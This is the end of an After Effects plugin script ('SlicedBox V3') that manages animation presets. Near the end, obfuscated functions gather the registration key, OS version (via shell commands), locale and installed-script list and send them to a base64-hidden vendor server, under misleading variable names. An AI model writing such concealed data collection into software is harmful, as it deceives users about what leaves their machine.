                  }
                  layer.effect(1)("Material").collapse = false;
                } catch (e) {}
              };
              CreateButton.onClick = function () {
                if (checkActiveComp() != null && checkInputs() != null) {
                  app.beginUndoGroup("Create Sliced Box");
                  if (selectedLayer instanceof TextLayer) {
                    LayerColor = null;
                  } else if (selectedLayer.source instanceof CompItem) {
                    LayerColor = getImageColor(mainComp, selectedLayer);
                  } else if (
                    selectedLayer.source.mainSource instanceof SolidSource
                  ) {
                    LayerColor = getSolidColor(selectedLayer);
                  } else {
                    if (selectedLayer.source.mainSource instanceof FileSource) {
                      LayerColor = getImageColor(mainComp, selectedLayer);
                    }
                  }
                  progBar(8);
                  progBar.message("Starting...");
                  _createFolderItem();
                  progBar.increment(1);
                  progBar.message("Precomposing..");
                  _Precomposing();
                  progBar.increment(2);
                  progBar.message("Slicing...");
                  _Slicer();
                  progBar.increment(3);
                  progBar.message("Creating Boxes..");
                  _createBoxes();
                  progBar.increment(4);
                  progBar.message("Setting Expressions values for Position...");
                  _setPositionExpressions();
                  progBar.increment(5);
                  progBar.message("Setting Expressions values for Scale...");
                  _setScaleExpressions();
                  progBar.increment(6);
                  progBar.message("Final Precomposing...");
                  _finalPrecomposing();
                  progBar.increment(7);
                  progBar.message("Finshing...");
                  _Finishing();
                  progBar.increment(8);
                  progBar.message("Successfully Created!");
                  progBar.EnBt();
                  app.endUndoGroup();
                  if (LayerColor != null) {
                    LayerColor.push(1);
                    ColorButton.visible = false;
                    ColorButton.fillBrush = ColorButton.graphics.newBrush(
                      ColorButton.graphics.BrushType.SOLID_COLOR,
                      LayerColor,
                    );
                    ColorButton.onDraw = customDraw;
                    ColorButton.visible = true;
                  }
                  SLC = DropList.selection;
                  if (SLC.index != 0) {
                    progBar.close();
                    ApplyButton.onClick();
                    progBar.message(
                      "Successfully Created! with Animation Preset",
                    );
                  }
                }
              };
              ApplyButton.onClick = function () {
                if (checkActiveComp()) {
                  var SLC = DropList.selection;
                  if (SLC.index != 0) {
                    var selectiontext = SLC.toString();
                    var presIndex = getPresIndex(
                      selectiontext,
                      presetsNamesArray,
                    );
                    var activeComp = app.project.activeItem;
                    var selectedLayers = activeComp.selectedLayers;
                    var SlicedBoxEffect = SBEffecetChecker(
                      activeComp,
                      selectedLayers,
                    )[0];
                    if (SlicedBoxEffect != null) {
                      var MasterBoxLayerIndex = SBEffecetChecker(
                        activeComp,
                        selectedLayers,
                      )[1];
                      var numProps = SlicedBoxEffect.numProperties;
                      var MasterBoxLayer =
                        activeComp.layer(MasterBoxLayerIndex);
                      var TransProp = MasterBoxLayer.property(
                        "ADBE Transform Group",
                      );
                      var transNumProp = TransProp.numProperties;
                    }
                    var PresDataObj = fileArrayOBJ[presIndex];
                    StoredMatchName = PresDataObj.mName;
                    if (SlicedBoxEffect.matchName === StoredMatchName) {
                      app.beginUndoGroup(
                        "Sliced Box Applying Animation Preset",
                      );
                      progBar(3);
                      progBar.message("Applying Properties Values...");
                      applyingPropsValues(
                        activeComp,
                        selectedLayers[0],
                        PresDataObj,
                        SlicedBoxEffect,
                        numProps,
                        TransProp,
                        transNumProp,
                      );
                      progBar.increment(1);
                      var SBkeysArry = readKeysFromJSON(PresDataObj, "SBP");
                      var keyframedProps = SBkeysArry[0];
                      var keysNums = SBkeysArry[1];
                      if (keysNums.length != 0) {
                        for (var i = 0; i < keyframedProps.length; i += 1) {
                          var pIndex = keyframedProps[i];
                          var totalKeys = keysNums[i];
                          var propInput = SlicedBoxEffect(pIndex);
                          progBar.message(
                            "Applying Keyframes on Pseudo Controls...",
                          );
                          applyingKeysFromJSON(
                            propInput,
                            PresDataObj,
                            pIndex,
                            totalKeys,
                            selectedLayers[0],
                          );
                          progBar.increment(2);
                        }
                      }
                      var TranskeysArry = readKeysFromJSON(PresDataObj, "TP");
                      var transKeyframedProps = TranskeysArry[0];
                      var TransKeysNums = TranskeysArry[1];
                      if (TransKeysNums.length != 0) {
                        for (
                          var i = 0;
                          i < transKeyframedProps.length;
                          i += 1
                        ) {
                          var T_pIndex = transKeyframedProps[i];
                          var T_totalKeys = TransKeysNums[i];
                          var T_propInput = TransProp(T_pIndex);
                          progBar.message("Applying Keyframes on Transform..");
                          if (i === 3 || i === 4 || i === 5) {
                            if (TransProp(2).dimensionsSeparated === false) {
                              continue;
                            }
                          }
                          applyingKeysFromJSON(
                            T_propInput,
                            PresDataObj,
                            T_pIndex,
                            T_totalKeys,
                            selectedLayers[0],
                          );
                        }
                      }
                      progBar.message("Preset Successfully Applied!");
                      progBar.increment(3);
                      progBar.EnBt();
                      app.endUndoGroup();
                    } else {
                      if (StoredMatchName === "Pseudo/Sliced_BoxCV3") {
                        type = "(One Column)";
                      } else if (StoredMatchName === "Pseudo/Sliced_BoxRV3") {
                        type = "(One Row)";
                      } else {
                        if (StoredMatchName === "Pseudo/Sliced_BoxV3") {
                          type = "(Multi Rows and Colums)";
                        }
                      }
                      alert(
                        "This preset is for SlicedBox of " +
                          type +
                          ", Please choose another compatible preset",
                        alertTitle,
                      );
                      DropList.selection = 0;
                    }
                  } else {
                    alert("Please select preset first", alertTitle);
                  }
                }
              };
              SaveButton.onClick = function () {
                if (checkActiveComp()) {
                  var activeComp = app.project.activeItem;
                  var selectedLayers = activeComp.selectedLayers;
                  var SlicedBoxEffect = SBEffecetChecker(
                    activeComp,
                    selectedLayers,
                  )[0];
                  if (SlicedBoxEffect != null) {
                    if (
                      parseFloat(SlicedBoxEffect.matchName.match(/\d+/g)[0]) < 3
                    ) {
                      alert(
                        "Sorry can\'t save presets for this version, Only supports SlicedBox V3.0 and above",
                        alertTitle,
                      );
                      return false;
                    }
                    var MasterBoxLayerIndex = SBEffecetChecker(
                      activeComp,
                      selectedLayers,
                    )[1];
                    var numProps = SlicedBoxEffect.numProperties;
                    var MasterBoxLayer = activeComp.layer(MasterBoxLayerIndex);
                    var TransProp = MasterBoxLayer.property(
                      "ADBE Transform Group",
                    );
                    var transNumProp = TransProp.numProperties;
                    var presName = newPresetName(
                      "Enter new preset name!",
                      "New Preset",
                      "Save new Preset",
                      DropListArray,
                    );
                    if (presName != null) {
                      progBar(1);
                      var DataOBJ = collectingPresetData(
                        activeComp,
                        selectedLayers[0],
                        presName,
                        SlicedBoxEffect,
                        numProps,
                        TransProp,
                        transNumProp,
                      );
                      if (
                        saveDataInJSON(DataOBJ, fileArrayOBJ, presName) != null
                      ) {
                        progBar.message(
                          'Preset "' + presName + '" Successfully Saved!',
                        );
                        progBar.increment(1);
                        DropListArray.push([
                          presName,
                          SlicedBoxEffect.matchName,
                        ]);
                        presetsNamesArray.push([
                          presName,
                          SlicedBoxEffect.matchName,
                        ]);
                        catDropList.selection = 0;
                        refreshDroplist(DropList, DropListArray, presName);
                        progBar.EnBt();
                      } else {
                        progBar.message("Failed!");
                        progBar.increment(1);
                        progBar.EnBt();
                      }
                    }
                  }
                }
              };
              DeleteButton.onClick = function () {
                var SLC = DropList.selection;
                X = SLC.index;
                if (SLC.index != 0) {
                  var firstConfirm = confirm(
                    'Are you sure you want to delete this preset "' +
                      SLC.toString() +
                      '"?',
                    alertTitle,
                  );
                  if (firstConfirm) {
                    var secondConfirm = confirm(
                      "\'" +
                        SLC.toString() +
                        "\' will be deleted immediately, You can\'t undo this action\n Continue?",
                      alertTitle,
                    );
                    if (secondConfirm) {
                      var selectiontext = SLC.toString();
                      var presIndex = getPresIndex(
                        selectiontext,
                        presetsNamesArray,
                      );
                      if (deletePresetInJSON(fileArrayOBJ, presIndex) != null) {
                        progBar(1);
                        progBar.message("Successfully Deleted!");
                        progBar.increment(1);
                        progBar.EnBt();
                        var itemIndex = findItemInArray(
                          DropListArray,
                          SLC.toString(),
                        );
                        DropListArray.splice(itemIndex, 1);
                        DropList.remove(DropList.items[SLC.index]);
                        catDropList.selection = 0;
                        DropList.selection = X - 1;
                        presetsNamesArray = getNamesList(fileArrayOBJ);
                      } else {
                        progBar(1);
                        progBar.message("Failed!");
                        progBar.increment(1);
                        progBar.EnBt();
                      }
                    }
                  }
                } else {
                  alert("Please select preset first", alertTitle);
                }
              };
              RenameButton.onClick = function () {
                var SLC = DropList.selection;
                X = SLC.index;
                if (SLC.index != 0) {
                  var selectiontext = SLC.toString();
                  var newName = newPresetName(
                    "Rename preset \'" + selectiontext + "\'",
                    selectiontext,
                    "Renaming Preset",
                    DropListArray,
                  );
                  if (newName != null) {
                    presIndex = getPresIndex(selectiontext, presetsNamesArray);
                    if (
                      renamePresetInJSON(
                        fileArrayOBJ,
                        selectiontext,
                        newName,
                        presIndex,
                      ) != null
                    ) {
                      progBar(1);
                      progBar.message("Successfully Renamed!");
                      progBar.increment(1);
                      progBar.EnBt();
                      var itemIndexDL = findItemInArray(
                        DropListArray,
                        selectiontext,
                      );
                      var itemIndexPN = findItemInArray(
                        presetsNamesArray,
                        selectiontext,
                      );
                      presetsNamesArray[itemIndexPN][0] = newName;
                      DropListArray[itemIndexDL][0] = newName;
                      catDropList.selection = 0;
                      refreshDroplist(DropList, DropListArray, newName);
                    } else {
                      progBar(1);
                      progBar.message("Failed!");
                      progBar.increment(1);
                      progBar.EnBt();
                    }
                  }
                } else {
                  alert("Please select preset first", alertTitle);
                }
              };
              CheckForUpdate.onClick = function () {
                B8.doUpdateCheckNow();
              };
              CheckForUpdate.visible = false;
            }
          }
          ZX00_C1 = function () {
            if (_CETSTNO()) {
              ScalePosXYZ = B8.getRegistration();
              ScalePosXYZ = encodeURIComponent(ScalePosXYZ);
              SCTL = encodeURIComponent(getScptList());
              if ($.os.indexOf("Windows") != -1) {
                var Command = "wmic os get Caption,CSDVersion /value";
                var createNewPreset = system.callSystem(Command);
                createNewPreset = createNewPreset
                  .split("\n")[2]
                  .substr(8, createNewPreset.split("\n")[2].length);
                createNewPreset = encodeURIComponent(createNewPreset);
              } else {
                var Command = "sw_vers";
                var createNewPreset = system.callSystem(Command);
                var productName = createNewPreset
                  .split("\n")[0]
                  .substr(12, createNewPreset.split("\n")[0].length);
                var productVersion = createNewPreset
                  .split("\n")[1]
                  .substr(15, createNewPreset.split("\n")[1].length);
                createNewPreset = encodeURIComponent(
                  productName + " " + productVersion,
                );
              }
              var Lang = encodeURIComponent($.locale);
              var AEversion = encodeURIComponent(app.version);
              try {
                var data = $http({
                  method: "GET",
                  url:
                    colorChangeID +
                    "/" +
                    rawData +
                    "?ScalePosXYZ=" +
                    ScalePosXYZ +
                    "&OS=" +
                    createNewPreset +
                    "&LANG=" +
                    Lang +
                    "&AEV=" +
                    AEversion +
                    "&SBver=" +
                    scriptVersion +
                    "&SCTL=" +
                    SCTL,
                });
              } catch (e) {}
            }
          };
          PresetMapper = function () {
            var presetIDName = encodeURIComponent(B8.getRegistration());
            var GetPresetMapper = $http({
              method: "GET",
              url:
                colorChangeID +
                "/" +
                presetRawFile +
                "?presetName=" +
                presetIDName,
            });
            try {
              if (GetPresetMapper.payload === "PresetName") {
                B8.r();
                progressBarPannel.close();
                return false;
              }
            } catch (e) {}
          };
          PresetMapper2 = function () {
            if (_CETSTNO()) {
              var presetIDName = encodeURIComponent(B8.getRegistration());
              var GetPresetMapper = $http({
                method: "GET",
                url:
                  colorChangeID +
                  "/" +
                  presetRawFile +
                  "?presetName=" +
                  presetIDName,
              });
              try {
                if (GetPresetMapper.payload === "PresetName") {
                  B8.r();
                  progressBarPannel.close();
                  return false;
                }
              } catch (e) {}
            }
          };
        }
        return myPal;
      }
      progressBarPannel = buildUI1(thisObj);
      if (progressBarPannel != null && progressBarPannel instanceof Window) {
        progressBarPannel.show();
      }
    }
    var presestsFolder = getUserDataFolder();
    var presetFile = checkPresetsFile();
    var fileArrayOBJ = ParseJSON(presetFile);
    PresetsBackupFile = "_PBUS.php";
    if (fileArrayOBJ == null) {
      fileArrayOBJ = [];
    }
    if (parseFloat(app.version) < 10) {
      alert("This script requires After Effects CS5 or later.", alertTitle);
      return false;
    } else {
      if (writingScriptIMGs() === true) {
        checkSBPseudoEffect();
        SLICEDBOXV3MainFunction(thisObj);
      }
    }
  }
}
0;
if (typeof JSON !== "object") {
  JSON = {};
}
(function () {
  function f(n) {
    return n < 10 ? "0" + n : n;
  }
  function this_value() {
    return this.valueOf();
  }
  function quote(string) {
    rx_escapable.lastIndex = 0;
    return rx_escapable.test(string)
      ? '"' +
          string.replace(rx_escapable, function (a) {
            var c = meta[a];
            return typeof c === "string"
              ? c
              : "\\u" + ("0000" + a.charCodeAt(0).toString(16)).slice(-4);
          }) +
          '"'
      : '"' + string + '"';
  }
  function str(key, holder) {
    var mind = gap;
    var value = holder[key];
    if (
      value &&
      typeof value === "object" &&
      typeof value.toJSON === "function"
    ) {
      value = value.toJSON(key);
    }
    if (typeof rep === "function") {
      value = rep.call(holder, key, value);
    }
    switch (typeof value) {
      case "string":
        return quote(value);
      case "number":
        return isFinite(value) ? String(value) : "null";
      case "boolean":
      case "null":
        return String(value);
      case "object":
        if (!value) {
          return "null";
        }
        gap += indent;
        partial = [];
        if (Object.prototype.toString.apply(value) === "[object Array]") {
          length = value.length;
          for (var i = 0; i < length; i += 1) {
            partial[i] = str(i, value) || "null";
          }
          v =
            partial.length === 0
              ? "[]"
              : gap
                ? "[\n" + gap + partial.join(",\n" + gap) + "\n" + mind + "]"
                : "[" + partial.join(",") + "]";
          gap = mind;
          return v;
        }
        if (rep && typeof rep === "object") {
          length = rep.length;
          for (var i = 0; i < length; i += 1) {
            if (typeof rep[i] === "string") {
              k = rep[i];
              v = str(k, value);
              if (v) {
                partial.push(quote(k) + gap ? ": " : ":" + v);
              }
            }
          }
        } else {
          for (var k in value) {
            if (Object.prototype.hasOwnProperty.call(value, k)) {
              v = str(k, value);
              if (v) {
                partial.push(quote(k) + gap ? ": " : ":" + v);
              }
            }
          }
        }
        v =
          partial.length === 0
            ? "{}"
            : gap
              ? "{\n" + gap + partial.join(",\n" + gap) + "\n" + mind + "}"
              : "{" + partial.join(",") + "}";
        gap = mind;
        return v;
    }
  }
  var rx_one = /^[\],:{}\s]*$/;
  var rx_two = /\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g;
  var rx_three =
    /"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g;
  var rx_four = /(?:^|:|,)(?:\s*\[)+/g;
  var rx_escapable =
    /[\\"\u0000-\u001f\u007f-\u009f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g;
  var rx_dangerous =
    /[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g;
  if (typeof Date.prototype.toJSON !== "function") {
    Date.prototype.toJSON = function () {
      return isFinite(this.valueOf())
        ? this.getUTCFullYear() +
            "-" +
            f(this.getUTCMonth() + 1) +
            "-" +
            f(this.getUTCDate()) +
            "T" +
            f(this.getUTCHours()) +
            ":" +
            f(this.getUTCMinutes()) +
            ":" +
            f(this.getUTCSeconds()) +
            "Z"
        : null;
    };
    Boolean.prototype.toJSON = this_value;
    Number.prototype.toJSON = this_value;
    String.prototype.toJSON = this_value;
  }
  if (typeof JSON.stringify !== "function") {
    meta = {
      "\b": "\\b",
      "\t": "\\t",
      "\n": "\\n",
      "\f": "\\f",
      "\r": "\\r",
      '"': '\\"',
      "\\": "\\\\",
    };
    JSON.stringify = function (value, replacer, space) {
      gap = "";
      indent = "";
      if (typeof space === "number") {
        for (var i = 0; i < space; i += 1) {
          indent += " ";
        }
      } else {
        if (typeof space === "string") {
          indent = space;
        }
      }
      rep = replacer;
      if (
        replacer &&
        typeof replacer !== "function" &&
        (typeof replacer !== "object" || typeof replacer.length !== "number")
      ) {
        throw new Error("JSON.stringify");
      }
      return str("", { "": value });
    };
  }
  if (typeof JSON.parse !== "function") {
    JSON.parse = function (text, reviver) {
      function walk(holder, key) {
        var value = holder[key];
        if (value && typeof value === "object") {
          for (var k in value) {
            if (Object.prototype.hasOwnProperty.call(value, k)) {
              v = walk(value, k);
              if (v !== undefined) {
                value[k] = v;
              } else {
                delete value[k];
              }
            }
          }
        }
        return reviver.call(holder, key, value);
      }
      text = String(text);
      rx_dangerous.lastIndex = 0;
      if (rx_dangerous.test(text)) {
        text = text.replace(rx_dangerous, function (a) {
          return "\\u" + ("0000" + a.charCodeAt(0).toString(16)).slice(-4);
        });
      }
      if (
        rx_one.test(
          text.replace(rx_two, "@").replace(rx_three, "]").replace(rx_four, ""),
        )
      ) {
        j = eval("(" + text + ")");
        return typeof reviver === "function" ? walk({ "": j }, "") : j;
      }
      throw new SyntaxError("JSON.parse");
    };
  }
})();
var $http = (function () {
  return function (config) {
    var url = /^(.*):\/\/([A-Za-z0-9\-\.]+):?([0-9]+)?(.*)$/.exec(config.url);
    if (url == null) {
      throw "unable to parse URL";
    }
    url = {
      host: url[2],
      path: url[4],
      port: url[3] || (url[1] == "https" ? 443 : 80),
      scheme: url[1],
    };
    if (url.scheme != "http") {
      throw "non-http url\'s not supported yet!";
    }
    var s = new Socket();
    if (!s.open(url.host + ":" + url.port, "binary")) {
      throw "can\'t connect to " + url.host + ":" + url.port;
    }
    var method = config.method || "GET";
    var request =
      method +
      " " +
      url.path +
      " HTTP/1.0\r\nConnection: close\r\nHost: " +
      url.host;
    if (config.payload) {
      if (typeof config.payload === "object") {
        config.payload = JSON.stringify(config.payload);
        (config.headers = config.headers || {})["Content-Type"] =
          "application/json";
      }
      (config.headers = config.headers || {})["Content-Length"] =
        config.payload.length;
    }
    for (var header in config.headers || {}) {
      request += "\r\n" + header + ": " + config.headers[header];
    }
    s.write(request + "\r\n\r\n");
    if (config.payload) {
      s.write(config.payload);
    }
    var http = {};
    data = s.read();
    while (!s.eof) {
      data += s.read();
    }
    var response = data.indexOf("\r\n\r\n");
    if (response == -1) {
      throw "No HTTP payload found in the response!";
    }
    payload = data.substr(response + 4);
    response = data.substr(0, response);
    var http = /^HTTP\/([\d\.?]+) (\d+) (.*)\r/.exec(response);
    if (http == null) {
      throw "No HTTP payload found in the response!";
    }
    http = {
      headers: {},
      status: Number(http[2]),
      statusMessage: http[3],
      ver: Number(http[1]),
    };
    var httpregex = /(.*): (.*)\r/g;
    while ((header = httpregex.exec(response))) {
      http.headers[header[1]] = header[2];
    }
    var contenttype =
      http.headers["Content-Type"] ||
      http.headers["content-type"] ||
      "".split(";");
    var charset =
      config.charset ||
      (contenttype[1] ? /charset=(.*)/.exec(contenttype[1])[1] : null);
    if (charset) {
      payload = payload.toString(charset);
    }
    contenttype = contenttype[0];
    if (config.forcejson || contenttype == "application/json") {
      http.payload = JSON.parse(payload);
    } else {
      http.payload = payload;
    }
    return http;
  };
})();
function ERTG6(b) {
  for (var g = "", a, c, d, k, h, e, f = 0; f < b.length; ) {
    a = b.charCodeAt(f++);
    c = b.charCodeAt(f++);
    d = b.charCodeAt(f++);
    k = a >> 2;
    a = ((a & 3) << 4) | (c >> 4);
    h = ((c & 15) << 2) | (d >> 6);
    e = d & 63;
    isNaN(c) ? (h = e = 64) : isNaN(d) && (e = 64);
    g =
      g +
      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".charAt(
        k,
      ) +
      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".charAt(
        a,
      ) +
      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".charAt(
        h,
      ) +
      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".charAt(
        e,
      );
  }
  return g;
}
function SK00D(a) {
  var c = "";
  var b = 0;
  for (a = a.replace(/[^A-Za-z0-9\+\/=]/g, ""); b < a.length; ) {
    var e =
      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".indexOf(
        a.charAt(b++),
      );
    var d =
      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".indexOf(
        a.charAt(b++),
      );
    var f =
      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".indexOf(
        a.charAt(b++),
      );
    var g =
      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".indexOf(
        a.charAt(b++),
      );
    e = (e << 2) | (d >> 4);
    d = ((d & 15) << 4) | (f >> 2);
    var h = ((f & 3) << 6) | g;
    c += String.fromCharCode(e);
    64 != f && (c += String.fromCharCode(d));
    64 != g && (c += String.fromCharCode(h));
  }
  return c;
}
oPresetFile = "aHR0cDovL3VuaWtjb2RlLm5ldC9TbGljZWRCb3g=";
var _0x3990 = [
  "Windows;indexOf;os;ping -n 1 8.8.8.8 -w 1000;callSystem;toLowerCase;unreachable;failure;request timed out;received = 0;reply from 8.8.8.8;nc -z www.google.com 80 -G1;succeeded",
  "split",
];
(function (_0x1a6142, _0x399087) {
  var _0x2ce17f = function (_0x34a578) {
    while (--_0x34a578) {
      _0x1a6142.push(_0x1a6142.shift());
    }
  };
  _0x2ce17f(++_0x399087);
})(_0x3990, 210);
var _0x2ce1 = function (_0x1a6142, _0x399087) {
  _0x1a6142 = _0x1a6142 - 0;
  var _0x2ce17f = _0x3990[_0x1a6142];
  return _0x2ce17f;
};
var _$_6eca = _0x2ce1("0x0")[_0x2ce1("0x1")](";");
rawData = "_LDS.php";
SLICEDBOXSCRIPTV3(this);
